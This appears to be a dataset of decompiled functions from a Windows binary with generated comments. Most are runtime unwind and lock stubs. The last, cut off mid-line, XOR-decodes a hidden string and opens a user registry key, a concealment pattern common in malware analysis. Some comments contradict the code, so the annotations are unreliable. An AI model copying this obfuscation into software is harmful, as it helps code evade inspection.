{"Function Name": "Unwind@14001fb80", "Address": "14001fb80", "Source Code": "\nvoid Unwind_14001fb80(undefined8 input_param, longlong memory_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the memory address (param_2 + 0x110).\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(memory_address + 0x110));\n}\n"}
{"Function Name": "Unwind@14001fb90", "Address": "14001fb90", "Source Code": "\nvoid Unwind_14001fb90(undefined8 input_param, longlong address_offset)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address calculated by adding 0x90 to param_2\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(address_offset + 0x90));\n}\n"}
{"Function Name": "Unwind@14001fb9c", "Address": "14001fb9c", "Source Code": "\nvoid Unwind_14001fb9c(undefined8 input_param, longlong address_offset)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address (param_2 + 0x70).\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(address_offset + 0x70));\n}\n"}
{"Function Name": "Unwind@14001fbb0", "Address": "14001fbb0", "Source Code": "\nvoid Unwind_14001fbb0(undefined8 input_param, longlong resource_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address (param_2 + 0x88) to free its resources.\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(resource_address + 0x88));\n}\n"}
{"Function Name": "Unwind@14001fbc0", "Address": "14001fbc0", "Source Code": "\nvoid Unwind_14001fbc0(undefined8 input_param, longlong resource_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address (param_2 + 0x60) to deallocate its resources.\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(resource_address + 0x60));\n}\n"}
{"Function Name": "Unwind@14001fbd0", "Address": "14001fbd0", "Source Code": "\nvoid Unwind_14001fbd0(undefined8 input_param, longlong address_offset)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address calculated by adding 0x68 to param_2\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(address_offset + 0x68));\n}\n"}
{"Function Name": "Unwind@14001fbdc", "Address": "14001fbdc", "Source Code": "\nvoid Unwind_14001fbdc(undefined8 input_param, longlong memory_address)\n{\n    // Call the _Tidy_deallocate method on a basic_string<wchar_t> object\n    // located at the address calculated by adding 0xa8 to param_2\n    std::basic_string<wchar_t>::_Tidy_deallocate((basic_string<wchar_t> *)(memory_address + 0xa8));\n}\n"}
{"Function Name": "Unwind@14001fbf0", "Address": "14001fbf0", "Source Code": "\nvoid Unwind_14001fbf0(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006d60 with the address calculated by adding 0x98 to param_2\n    FUN_140006d60((longlong *)(address_offset + 0x98));\n}\n"}
{"Function Name": "Unwind@14001fbfc", "Address": "14001fbfc", "Source Code": "\nvoid Unwind_14001fbfc(undefined8 input_param, longlong address_base)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x58 to param_2\n    FUN_140006e60((longlong *)(address_base + 0x58));\n}\n"}
{"Function Name": "Unwind@14001fc08", "Address": "14001fc08", "Source Code": "\nvoid Unwind_14001fc08(undefined8 inputValue, longlong baseAddress)\n{\n    // Check if the least significant bit of the value at offset 0x40 from param_2 is set\n    if (*(uint *)(baseAddress + 0x40) & 1) {\n        // Clear the least significant bit at offset 0x40 from param_2\n        *(uint *)(baseAddress + 0x40) &= 0xfffffffe;\n        // Call FUN_140006e60 with the address at offset 0x20 from param_2\n        FUN_140006e60((longlong *)(baseAddress + 0x20));\n    }\n}\n"}
{"Function Name": "Unwind@14001fc2e", "Address": "14001fc2e", "Source Code": "\nvoid Unwind_14001fc2e(undefined8 input_param, longlong address)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x78 to param_2\n    FUN_140006e60((longlong *)(address + 0x78));\n}\n"}
{"Function Name": "Unwind@14001fc3a", "Address": "14001fc3a", "Source Code": "\nvoid Unwind_14001fc3a(undefined8 input_value, longlong base_address)\n{\n    // Check if the second bit of the value at offset 0x40 from param_2 is set\n    if (*(uint *)(base_address + 0x40) & 2) {\n        // Clear the second bit of the value at offset 0x40 from param_2\n        *(uint *)(base_address + 0x40) &= 0xfffffffd;\n        // Call FUN_140006e60 with the address at offset 0x20 from param_2\n        FUN_140006e60((longlong *)(base_address + 0x20));\n    }\n}\n"}
{"Function Name": "Unwind@14001fc60", "Address": "14001fc60", "Source Code": "\nvoid Unwind_14001fc60(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x20 to param_2\n    FUN_140006e60((longlong *)(address_offset + 0x20));\n}\n"}
{"Function Name": "Unwind@14001fc6c", "Address": "14001fc6c", "Source Code": "\nvoid Unwind_14001fc6c(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x20 to param_2\n    FUN_140006e60((longlong *)(address_offset + 0x20));\n}\n"}
{"Function Name": "Unwind@14001fc78", "Address": "14001fc78", "Source Code": "\nvoid Unwind_14001fc78(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x20 to param_2\n    FUN_140006e60((longlong *)(address_offset + 0x20));\n}\n"}
{"Function Name": "Unwind@14001fc84", "Address": "14001fc84", "Source Code": "\nvoid Unwind_14001fc84(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006e60 with the address calculated by adding 0x20 to param_2\n    FUN_140006e60((longlong *)(address_offset + 0x20));\n}\n"}
{"Function Name": "Unwind@14001fc90", "Address": "14001fc90", "Source Code": "\nvoid Unwind_14001fc90(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006700 with a pointer to the memory address \n    // obtained by adding 0x50 to the value of param_2\n    FUN_140006700((longlong *)(address_offset + 0x50));\n}\n"}
{"Function Name": "Unwind@14001fc9c", "Address": "14001fc9c", "Source Code": "\nvoid Unwind_14001fc9c(undefined8 input_value, longlong base_address)\n{\n    // Check if the second bit of the value at offset 0x20 from param_2 is set\n    if (*(uint *)(base_address + 0x20) & 2) {\n        // Clear the second bit of the value at offset 0x20 from param_2\n        *(uint *)(base_address + 0x20) &= 0xfffffffd;\n        // Call the function FUN_140006e60 with the address at offset 0x28 from param_2\n        FUN_140006e60((longlong *)(base_address + 0x28));\n    }\n}\n"}
{"Function Name": "Unwind@14001fcd0", "Address": "14001fcd0", "Source Code": "\nvoid Unwind_14001fcd0(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140006d60 with the address calculated by adding 0x50 to param_2\n    FUN_140006d60((longlong *)(address_offset + 0x50));\n}\n"}
{"Function Name": "Unwind@14001fce0", "Address": "14001fce0", "Source Code": "\nvoid Unwind_14001fce0(undefined8 input_value, longlong base_address)\n{\n    // Check if the least significant bit of the value at offset 0x60 is set\n    if (*(uint *)(base_address + 0x60) & 1) {\n        // Clear the least significant bit at offset 0x60\n        *(uint *)(base_address + 0x60) &= 0xfffffffe;\n        // Call FUN_140007930 with a pointer derived from offset 0x50 and an additional offset of 0x98\n        FUN_140007930((ios_base *)(*(longlong *)(base_address + 0x50) + 0x98));\n    }\n}\n"}
{"Function Name": "Unwind@14001fd0d", "Address": "14001fd0d", "Source Code": "\nvoid Unwind_14001fd0d(undefined8 input_param, longlong object_address)\n{\n    // Call the destructor for the basic_istream object located at the offset of 0x18\n    // from the address stored at (param_2 + 0x50).\n    ~basic_istream<>(*(longlong *)(object_address + 0x50) + 0x18);\n}\n"}
{"Function Name": "Unwind@14001fd1d", "Address": "14001fd1d", "Source Code": "\nvoid Unwind_14001fd1d(undefined8 input_param, longlong base_address)\n{\n    // Cast the value at (param_2 + 0x50) to a longlong pointer and dereference it\n    // to get the address of a basic_iostream object.\n    // Then, add 0x20 to this address to access the specific basic_iostream instance.\n    // Finally, call the destructor for the basic_iostream instance.\n    ((basic_iostream<char, struct std::char_traits<char> > *)\n    (*(longlong *)(base_address + 0x50) + 0x20))->~basic_iostream<char, struct std::char_traits<char> >();\n}\n"}
{"Function Name": "Unwind@14001fd30", "Address": "14001fd30", "Source Code": "\nvoid Unwind_14001fd30(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_1400020b0 with the address calculated by adding 0x28 to param_2\n    FUN_1400020b0(address_offset + 0x28);\n}\n"}
{"Function Name": "Unwind@14001fd3c", "Address": "14001fd3c", "Source Code": "\nvoid Unwind_14001fd3c(undefined8 input_param, longlong base_address)\n{\n    // Destroy the lock object located at the offset 0x54 from the base address 'param_2'\n    std::_Lockit::~_Lockit((_Lockit *)(base_address + 0x54));\n}\n"}
{"Function Name": "Unwind@14001fd48", "Address": "14001fd48", "Source Code": "\nvoid Unwind_14001fd48(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140008a10 with the address calculated by adding 0x58 to param_2\n    FUN_140008a10((longlong *)(address_offset + 0x58));\n}\n"}
{"Function Name": "Unwind@14001fd60", "Address": "14001fd60", "Source Code": "\nvoid Unwind_14001fd60(undefined8 input_value, longlong object_pointer)\n{\n    // Check if the least significant bit of the value at offset 0x20 of param_2 is set\n    if (*(uint *)(object_pointer + 0x20) & 1) {\n        // Clear the least significant bit at offset 0x20 of param_2\n        *(uint *)(object_pointer + 0x20) &= 0xfffffffe;\n        \n        // Deallocate memory for the string located at offset 0x30 of param_2\n        std::basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t>>::_Tidy_deallocate(\n            *(basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t>**>(object_pointer + 0x30));\n    }\n}\n"}
{"Function Name": "Unwind@14001fd90", "Address": "14001fd90", "Source Code": "\nvoid Unwind_14001fd90(undefined8 input_value, longlong memory_address)\n{\n    // Call the function FUN_1400088a0 with a pointer to the memory address \n    // obtained by adding 0x40 to the value of param_2\n    FUN_1400088a0((longlong *)(memory_address + 0x40));\n}\n"}
{"Function Name": "Catch_All@14001fd9c", "Address": "14001fd9c", "Source Code": "\nundefined * Catch_All_14001fd9c(undefined8 input_param,longlong data_pointer)\n{\n    longlong calculated_value; // Declare a variable to hold a longlong value\n\n    // Retrieve a pointer from the structure at offset 0x30 of param_2, dereference it, and calculate lVar1\n    calculated_value = (longlong)*(int *)(**(longlong **)(data_pointer + 0x30) + 4) +\n             (longlong)*(longlong **)(data_pointer + 0x30);\n\n    // Call the function FUN_1400024f0 with lVar1, a modified value from lVar1, and a constant character\n    FUN_1400024f0(calculated_value, *(uint *)(calculated_value + 0x10) | 4, '\\x01');\n\n    // Return a pointer to a predefined data location\n    return &DAT_1400084a6;\n}\n"}
{"Function Name": "Unwind@14001fdf0", "Address": "14001fdf0", "Source Code": "\nvoid Unwind_14001fdf0(undefined8 input_param, longlong address)\n{\n    // Call the function FUN_140008a50 with a pointer obtained from param_2\n    // The pointer is located at an offset of 0x50 from param_2\n    function_call(*(longlong **)(address + 0x50));\n}\n"}
{"Function Name": "Unwind@14001fdfc", "Address": "14001fdfc", "Source Code": "\nvoid Unwind_14001fdfc(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_1400088a0 with the address calculated by adding 0x28 to param_2\n    FUN_1400088a0((longlong *)(address_offset + 0x28));\n}\n"}
{"Function Name": "Unwind@14001fe30", "Address": "14001fe30", "Source Code": "\nvoid Unwind_14001fe30(undefined8 input_value, longlong memory_address)\n{\n    // Call the function FUN_1400088a0 with a pointer to the memory address \n    // calculated by adding 0x30 to the value of param_2\n    FUN_1400088a0((longlong *)(memory_address + 0x30));\n}\n"}
{"Function Name": "Catch_All@14001fe3c", "Address": "14001fe3c", "Source Code": "\nundefined * Catch_All_14001fe3c(undefined8 input_param, longlong data_structure)\n{\n    longlong calculated_value; // Declare a variable to hold a long long integer\n\n    // Retrieve a pointer from the structure at offset 0x28 of param_2, dereference it, and calculate lVar1\n    calculated_value = (longlong)*(int *)(**(longlong **)(data_structure + 0x28) + 4) + (longlong)*(longlong **)(data_structure + 0x28);\n    \n    // Call the function FUN_1400024f0 with lVar1, a modified value from lVar1, and a flag\n    process_data(calculated_value, *(uint *)(calculated_value + 0x10) | 4, '\\x01');\n    \n    // Return a pointer to a predefined data location\n    return &predefined_data_location;\n}\n"}
{"Function Name": "Unwind@14001fe82", "Address": "14001fe82", "Source Code": "\nvoid Unwind_14001fe82(undefined8 lockit_instance, longlong lockit_address)\n{\n    // Call the destructor of the std::_Lockit class\n    // The destructor is being called on an instance of _Lockit located at the address (param_2 + 0x40)\n    std::_Lockit::~_Lockit((_Lockit *)(lockit_address + 0x40));\n}\n"}
{"Function Name": "FUN_14001fe8e", "Address": "14001fe8e", "Source Code": "\nbool FUN_14001fe8e(undefined8 *input_pointer)\n{\n    // Dereference the pointer 'param_1' and cast it to an integer pointer\n    // Check if the value pointed to is equal to -0x3ffffffb\n    return *(int *)*input_pointer == -0x3ffffffb;\n}\n"}
{"Function Name": "FUN_14001fea6", "Address": "14001fea6", "Source Code": "\nvoid FUN_14001fea6(undefined8 *input_pointer)\n{\n    // Call the _seh_filter_exe function with the first integer value pointed to by param_1\n    // and the pointer param_1 itself as arguments.\n    exception_filter(*(int *)*input_pointer, input_pointer);\n}\n"}
{"Function Name": "FUN_14001fec4", "Address": "14001fec4", "Source Code": "\nundefined8 FUN_14001fec4(undefined8 input_value, longlong data_structure)\n{\n    longlong thread_data;\n\n    // Store the first parameter in two specific offsets of the second parameter\n    *(undefined8 *)(data_structure + 0x50) = input_value;\n    *(undefined8 *)(data_structure + 0x48) = input_value;\n\n    // Retrieve the pointer to the thread data\n    thread_data = get_thread_data();\n\n    // Set a value in the thread data structure using an offset from the second parameter\n    *(undefined8 *)(thread_data + 0x70) = *(undefined8 *)(data_structure + 0x80);\n\n    // Set another value in the thread data structure using a nested pointer from the second parameter\n    *(undefined8 *)(thread_data + 0x68) = *(undefined8 *)(**(longlong **)(data_structure + 0x48) + 0x38);\n\n    // Call a function with several parameters, including dereferenced values from the second parameter\n    process_exception((EHExceptionRecord *)**(undefined8 **)(data_structure + 0x48),\n                  *(__uint64 **)(data_structure + 0x88), *(_CONTEXT **)(data_structure + 0x90),\n                  *(_xDISPATCHER_CONTEXT **)(data_structure + 0x98), *(_s_FuncInfo **)(data_structure + 0xa0), 0,\n                  (__uint64 *)0x0, 1);\n\n    // Retrieve the pointer to the thread data again\n    thread_data = get_thread_data();\n\n    // Reset a value in the thread data structure to zero\n    *(undefined8 *)(thread_data + 0x70) = 0;\n\n    // Set a specific offset in the second parameter to 1\n    *(undefined4 *)(data_structure + 0x40) = 1;\n\n    // Return 1 as the function result\n    return 1;\n}\n"}
{"Function Name": "FUN_14001ff55", "Address": "14001ff55", "Source Code": "\nbool FUN_14001ff55(undefined8 input_param, longlong memory_address)\n{\n    // Check if the character at the memory address (param_2 + 0x38) is not null\n    return *(char *)(memory_address + 0x38) != '\\0';\n}\n"}
{"Function Name": "FUN_14001ff6d", "Address": "14001ff6d", "Source Code": "\nvoid FUN_14001ff6d(_EXCEPTION_POINTERS *exceptionPointers, longlong location)\n{\n    // Store the exception pointers in the specified location\n    *(_EXCEPTION_POINTERS **)(location + 0x58) = exceptionPointers;\n\n    // Call ExFilterRethrow with the exception pointers, exception record, and additional parameters\n    ExFilterRethrow(exceptionPointers, *(_EHExceptionRecord **)(location + 0xb8), (int *)(location + 0x20));\n}\n"}
{"Function Name": "FUN_14001ff92", "Address": "14001ff92", "Source Code": "\nvoid FUN_14001ff92(undefined8 inputParam, longlong dataPointer)\n{\n    int *intArrayPtr; // Pointer to an integer\n    int exceptionCheckResult;   // Variable to hold the result of exception check\n    longlong threadLocalDataPtr; // Variable to hold the pointer to thread-local data\n\n    _FindAndUnlinkFrame(*(longlong *)(dataPointer + 0x38)); // Unlink the frame from the stack\n\n    intArrayPtr = *(int **)(dataPointer + 0xb8); // Retrieve pointer to an integer array from the given parameter\n\n    // Check specific conditions on the data pointed to by piVar1 and a value in param_2\n    if ((*(int *)(dataPointer + 0x20) == 0) && \n        (*intArrayPtr == -0x1f928c9d) && \n        (intArrayPtr[6] == 4) && \n        (intArrayPtr[8] + 0xe66cfae0U < 3)) \n    {\n        exceptionCheckResult = _IsExceptionObjectToBeDestroyed(*(longlong *)(intArrayPtr + 10)); // Check if the exception object should be destroyed\n        if (exceptionCheckResult != 0) {\n            __DestructExceptionObject(intArrayPtr); // Destroy the exception object if needed\n        }\n    }\n\n    threadLocalDataPtr = __vcrt_getptd(); // Get the pointer to thread-local data\n    *(undefined8 *)(threadLocalDataPtr + 0x20) = *(undefined8 *)(dataPointer + 0xc0); // Set thread-local data field 0x20\n    *(undefined8 *)(threadLocalDataPtr + 0x28) = *(undefined8 *)(dataPointer + 0x40); // Set thread-local data field 0x28\n\n    return; // Exit the function\n}\n"}
{"Function Name": "FUN_14002000a", "Address": "14002000a", "Source Code": "\nvoid FUN_14002000a(undefined8 *frame_pointer) // Function definition with a pointer parameter\n{\n    __FrameUnwindFilter(frame_pointer); // Call to __FrameUnwindFilter with the pointer parameter\n}\n"}
{"Function Name": "FUN_140020020", "Address": "140020020", "Source Code": "\nvoid FUN_140020020(void)\n{\n    // Retrieve the pointer to the thread data structure\n    longlong threadDataPtr = __vcrt_getptd();\n    \n    // Check if the value at offset 0x30 in the thread data structure is greater than 0\n    if (0 < *(int *)(threadDataPtr + 0x30)) {\n        // Decrement the value at offset 0x30 by 1\n        *(int *)(threadDataPtr + 0x30) = *(int *)(threadDataPtr + 0x30) - 1;\n    }\n    \n    // Exit the function\n    return;\n}\n"}
{"Function Name": "FUN_140020043", "Address": "140020043", "Source Code": "\nvoid FUN_140020043(undefined8 resource, longlong resource_pointer)\n{\n    // Unlock the resource pointed to by the integer pointer located at offset 0x48 from param_2\n    __acrt_unlock(**(int **)(resource_pointer + 0x48));\n}\n"}
{"Function Name": "FUN_14002005d", "Address": "14002005d", "Source Code": "\nvoid unlock_function(void) // Function definition for FUN_14002005d\n{\n    unlock_acrt(0); // Call to __acrt_unlock with argument 0\n}\n"}
{"Function Name": "FUN_140020073", "Address": "140020073", "Source Code": "\nvoid FUN_140020073(undefined8 *input_pointer) // Function definition with a pointer to undefined8 type\n{\n    process_integer(*(int *)input_pointer); // Call to FUN_14001266c with the integer value pointed to by param_1\n}\n"}
{"Function Name": "FUN_14002008e", "Address": "14002008e", "Source Code": "\nvoid FUN_14002008e(undefined8 input_param, longlong data_pointer)\n{\n    // Dereference the pointer at offset 0x58 from param_2 to get an int pointer\n    // and then dereference that pointer to get the integer value.\n    // Call __acrt_unlock with the integer value obtained.\n    __acrt_unlock(**(int **)(data_pointer + 0x58));\n}\n"}
{"Function Name": "FUN_1400200a8", "Address": "1400200a8", "Source Code": "\nvoid FUN_1400200a8(undefined8 input_param, longlong base_address)\n{\n    // Dereference the pointer at (param_2 + 0x48) to get a pointer to an undefined8 type\n    // Then dereference that pointer to get a longlong pointer\n    // Finally, access the uint at offset 0x3a8 from that longlong pointer\n    // and perform a bitwise AND operation with 0xffffffef to clear a specific bit\n    *(uint *)(*(longlong *)**(undefined8 **)(base_address + 0x48) + 0x3a8) &= 0xffffffef;\n}\n"}
{"Function Name": "Unwind@1400200c9", "Address": "1400200c9", "Source Code": "\nvoid Unwind_1400200c9(undefined8 input_param, longlong memory_address)\n{\n    // Call the function FUN_14000f274 with a pointer to the memory location \n    // obtained by adding 0x58 to the value of param_2.\n    FUN_14000f274((longlong *)(memory_address + 0x58));\n}\n"}
{"Function Name": "FUN_1400200d5", "Address": "1400200d5", "Source Code": "\nundefined8 FUN_1400200d5(undefined8 *input_pointer)\n{\n    // Check if the integer value pointed to by param_1 is equal to -0x3ffffffb or -0x3fffffe3\n    return ((*(int *)*input_pointer == -0x3ffffffb) || (*(int *)*input_pointer == -0x3fffffe3)) ? 1 : 0; // Return 1 if true, otherwise return 0\n}\n"}
{"Function Name": "FUN_140020101", "Address": "140020101", "Source Code": "\nvoid unlockResourceFunction(void) // Function definition for FUN_140020101\n{\n    unlockResource(7); // Unlocks a resource identified by the integer 7\n}\n"}
{"Function Name": "FUN_14002011a", "Address": "14002011a", "Source Code": "\nvoid FUN_14002011a(undefined8 resource_id, longlong resource_pointer)\n{\n    // Check if the character at the offset 0x70 from param_2 is not null\n    if (*(char *)(resource_pointer + 0x70) != '\\0') {\n        // Call the function to unlock a resource identified by the value 3\n        __acrt_unlock(3);\n    }\n}\n"}
{"Function Name": "FUN_14002013b", "Address": "14002013b", "Source Code": "\nvoid unlockResourceFunction(void) // Function definition for FUN_14002013b\n{\n    unlockMutex(5); // Unlocks a resource or mutex identified by the integer 5\n}\n"}
{"Function Name": "FUN_140020154", "Address": "140020154", "Source Code": "\nvoid FUN_140020154(undefined8 input_param, longlong data_pointer)\n{\n    // Call the function FUN_140017c08 with the pointer obtained from the offset 0x48 of param_2\n    FUN_140017c08(*(longlong **)(data_pointer + 0x48));\n}\n"}
{"Function Name": "FUN_14002016f", "Address": "14002016f", "Source Code": "\nvoid FUN_14002016f(undefined8 resource_id, longlong resource_pointer)\n{\n    // Unlock the resource associated with the integer pointer located at offset 0x98 from param_2\n    __acrt_unlock(**(int **)(resource_pointer + 0x98));\n}\n"}
{"Function Name": "FUN_14002018c", "Address": "14002018c", "Source Code": "\nvoid unlockResourceFunction(void) // Function definition for FUN_14002018c\n{\n    unlockResource(4); // Unlock a resource identified by the integer 4\n}\n"}
{"Function Name": "FUN_1400201a5", "Address": "1400201a5", "Source Code": "\nvoid unlockResourceFunction(void) // Function definition for FUN_1400201a5\n{\n    unlockResource(8); // Unlocks a resource or critical section identified by the value 8\n}\n"}
{"Function Name": "FUN_1400201be", "Address": "1400201be", "Source Code": "\nvoid FUN_1400201be(undefined8 input_param, longlong data_pointer)\n{\n    // Call the function FID_conflict___acrt_lowio_lock_fh\n    // with the pointer to the uint located at offset 0x48 from param_2\n    lock_file_handle(*(uint **)(data_pointer + 0x48));\n}\n"}
{"Function Name": "FUN_1400201d8", "Address": "1400201d8", "Source Code": "\nvoid FUN_1400201d8(undefined8 file_handle, longlong file_descriptor)\n{\n    // Call the function to lock the file handle using the value at offset 0x50 from param_2\n    FID_conflict___acrt_lowio_lock_fh(*(uint *)(file_descriptor + 0x50));\n}\n"}
{"Function Name": "FUN_1400201ef", "Address": "1400201ef", "Source Code": "\nvoid FUN_1400201ef(undefined8 input_param, longlong address_offset)\n{\n    // Call the function FUN_140017c08 with the value at the memory address \n    // obtained by adding 0x30 to param_2, dereferencing it to get a longlong.\n    process_data(*(longlong *)(address_offset + 0x30));\n}\n"}
{"Function Name": "FUN_140020210", "Address": "140020210", "Source Code": "\nbool FUN_140020210(undefined8 *input_pointer) // Function definition, takes a pointer to undefined8 type\n{\n    return *(int *)*input_pointer == -0x3ffffffb; // Dereference param_1, cast to int pointer, check if value equals -0x3ffffffb\n}\n"}
{"Function Name": "FUN_140020230", "Address": "140020230", "Source Code": "\nvoid FUN_140020230(void)\n{\n    code *functionPointer; // Pointer to a function code\n\n    // Check if the value of DAT_140038b20 is greater than 15\n    if (0xf < thresholdValue) {\n        // Check if DAT_140038b20 + 1 is greater than 4095 and \n        // if the calculated value is greater than 8\n        if ((0xfff < thresholdValue + 1) &&\n            (0x1f < (CONCAT71(dataStruct._1_7_, (undefined1)dataStruct) -\n            *(longlong *)(CONCAT71(dataStruct._1_7_, (undefined1)dataStruct) + -8)) - 8U)) {\n            \n            // Call the function FUN_14000ed18\n            executeFunction();\n            \n            // Call the system interrupt and get the function pointer\n            functionPointer = (code *)systemInterrupt(3);\n            \n            // Execute the function pointed by pcVar1\n            (*functionPointer)();\n            return; // Exit the function\n        }\n        \n        // Call the thunk function FUN_14000b460\n        thunkFunction();\n    }\n    \n    // Set the first byte of DAT_140038b08 to 0\n    dataStruct._0_1_ = 0;\n}\n"}
{"Function Name": "FUN_1400202a0", "Address": "1400202a0", "Source Code": "\nvoid FUN_1400202a0(void)\n{\n    // Check if the global variable DAT_14003aa10 is not zero\n    if (globalVar1 != 0) {\n        // Check if the difference between DAT_14003aa20 and DAT_14003aa10 is greater than 0xfff\n        // and if the difference between DAT_14003aa10 and the value at (DAT_14003aa10 - 8) minus 8 is greater than 0x1f\n        if ((0xfff < (ulonglong)(globalVar2 - globalVar1)) &&\n            (0x1f < (globalVar1 - *(longlong *)(globalVar1 + -8)) - 8U)) {\n            // Call the function FUN_14000ed18\n            functionCall1();\n            // Call a function via software interrupt 3\n            ((code *)softwareInterrupt(3))();\n            return; // Exit the function\n        }\n        // Call the thunk function FUN_14000b460\n        thunkFunction();\n        // Reset the global variables DAT_14003aa20, DAT_14003aa10, and DAT_14003aa18 to zero\n        globalVar2 = 0;\n        globalVar1 = 0;\n        globalVar3 = 0;\n    }\n}\n"}
{"Function Name": "std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t", "Address": "140020310", "Source Code": "\nvoid __thiscall std::_Fac_tidy_reg_t::~_Fac_tidy_reg_t(_Fac_tidy_reg_t *this)\n{\n    // Loop until the pointer DAT_1400392c0 is null\n    while (linked_list_head != (undefined8 *)0x0) {\n        // Update DAT_1400392c0 to point to the next element in the linked list\n        linked_list_head = (undefined8 *)*linked_list_head;\n\n        // Call the guard dispatch function and check if it returns 0\n        if ((*(code *)guard_dispatch_function)() != 0) {\n            // If the guard dispatch function returns non-zero, call it with argument 1\n            (*(code *)guard_dispatch_function)(1);\n        }\n\n        // Call the thunk function FUN_14000b460\n        thunk_function();\n    }\n}\n"}
{"Function Name": "FUN_14002036c", "Address": "14002036c", "Source Code": "\nvoid FUN_14002036c(void)\n{\n    // Check if the global variable DAT_1400392a8 is not zero\n    if (global_variable_check != 0) {\n        // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8 and store the result in lVar1\n        longlong result_value = (*(code *)function_pointer)();\n        \n        // If the result lVar1 is not zero\n        if (result_value != 0) {\n            // Call the function again with lVar1 and the argument 1\n            (*(code *)function_pointer)(result_value, 1);\n        }\n    }\n}\n"}
{"Function Name": "_Init_atexit::~_Init_atexit", "Address": "1400203ac", "Source Code": "\nvoid __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *this)\n{\n    PVOID decodedPointer; // Declare a pointer variable to hold the decoded pointer\n    while (indexCounter < 10) { // Loop until DAT_140038068 is less than 10\n        decodedPointer = DecodePointer(*(PVOID *)(&pointerArray + (indexCounter * 8))); // Decode the pointer from the array using the current index\n        indexCounter++; // Increment the index counter\n        if (decodedPointer != (PVOID)0x0) { // Check if the decoded pointer is not null\n            (*(code *)guardDispatchFunction)(); // Call the function pointed to by PTR__guard_dispatch_icall_1400213e8\n        }\n    }\n}\n"}
{"Function Name": "FUN_1400030e0", "Address": "1400030e0", "Source Code": "void FUN_1400030e0(longlong *param_1)\n{\nWCHAR WVar1;\ncode *pcVar2;\nLSTATUS LVar3;\nWCHAR *pWVar4;\nlonglong lVar5;\nushort *puVar6;\nWCHAR *pWVar7;\nWCHAR *pWVar8;\nulonglong uVar9;\nWCHAR *pWVar10;\nulonglong uVar11;\nWCHAR WVar12;\nulonglong uVar13;\nbool bVar14;\nbool bVar15;\nundefined1 auStackY_1d8 [32];\nundefined2 local_180;\nundefined6 uStack_17e;\nlonglong lStack_178;\nlonglong local_170;\nulonglong uStack_168;\nundefined8 local_158;\nundefined8 local_150;\nundefined8 local_148;\nundefined8 local_140;\nundefined8 local_138;\nundefined8 local_130;\nundefined8 local_128;\nundefined8 local_120;\nundefined8 local_118;\nundefined8 local_110;\nundefined8 local_108;\nundefined8 local_100;\nundefined8 local_f8;\nundefined8 local_f0;\nundefined8 local_e8;\nundefined8 local_e0;\nundefined8 local_d8;\nundefined8 local_d0;\nundefined8 local_c8;\nundefined8 local_c0;\nundefined8 local_b8;\nlonglong *local_b0;\nulonglong local_a8;\nlonglong local_a0 [3];\nlonglong local_88 [3];\nHKEY local_70;\nWCHAR local_68;\nundefined6 uStack_66;\nulonglong local_58;\nulonglong local_50;\nDWORD local_48 [2];\nulonglong local_40;\nulonglong local_38;\n\nlocal_b8 = 0xfffffffffffffffe;\nlocal_38 = DAT_140038080 ^ (ulonglong)auStackY_1d8;\nlocal_158 = 0x55498a9a5733769f;\nlocal_150 = 0xe5e0294ba7b8b0d0;\nlocal_148 = 0x3f655b8c8e56c319;\nlocal_140 = 0x9906ab75af2144aa;\nlocal_138 = 0x78e9a3e0dbe2613;\nlocal_130 = 0xbbbe2af35618f84;\nlocal_128 = 0x9d7b465026754bad;\nlocal_120 = 0x42faa5d98b27b5ee;\nlocal_118 = 0xf64e27f2d2f2ed67;\nlocal_110 = 0xdaf257c38fc2fbf8;\n_DAT_14003ab30 = _DAT_14003ab30 ^ 0x55498a9a5733769f;\n_DAT_14003ab38 = _DAT_14003ab38 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ab40 = _DAT_14003ab40 ^ 0x3f655b8c8e56c319;\n_DAT_14003ab48 = _DAT_14003ab48 ^ 0x9906ab75af2144aa;\n_DAT_14003ab50 = _DAT_14003ab50 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ab58 = _DAT_14003ab58 ^ 0xbbbe2af35618f84;\n_DAT_14003ab60 = _DAT_14003ab60 ^ 0x9d7b465026754bad;\n_DAT_14003ab68 = _DAT_14003ab68 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ab70 = _DAT_14003ab70 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ab78 = _DAT_14003ab78 ^ 0xdaf257c38fc2fbf8;\nlocal_b0 = param_1;\nLVar3 = RegOpenKeyExW((HKEY)0xffffffff80000001,(LPCWSTR)&DAT_14003ab30,0,0xf003f,&local_70);\nif (LVar3 != 0) {\nLVar3 = 